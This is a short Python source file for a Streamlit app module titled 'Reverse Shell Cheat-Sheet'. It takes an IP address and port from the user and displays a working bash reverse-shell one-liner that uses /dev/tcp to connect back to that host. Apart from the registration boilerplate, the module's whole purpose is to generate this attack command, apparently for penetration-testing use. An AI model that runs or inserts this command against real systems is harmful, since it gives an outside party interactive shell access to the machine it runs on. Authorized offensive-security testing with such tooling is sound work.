import streamlit as st
from modules.base import BaseModule, ModuleRegistry
class ReverseShellModule(BaseModule):
    def __init__(self):
        super().__init__("Reverse Shell", "reverse_shell"); ModuleRegistry.register(self)
    def render(self):
        st.header("Reverse Shell Cheat-Sheet")
        ip = st.text_input("IP", "127.0.0.1")
        port = st.text_input("Port", "9001")
        st.code(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
ReverseShellModule()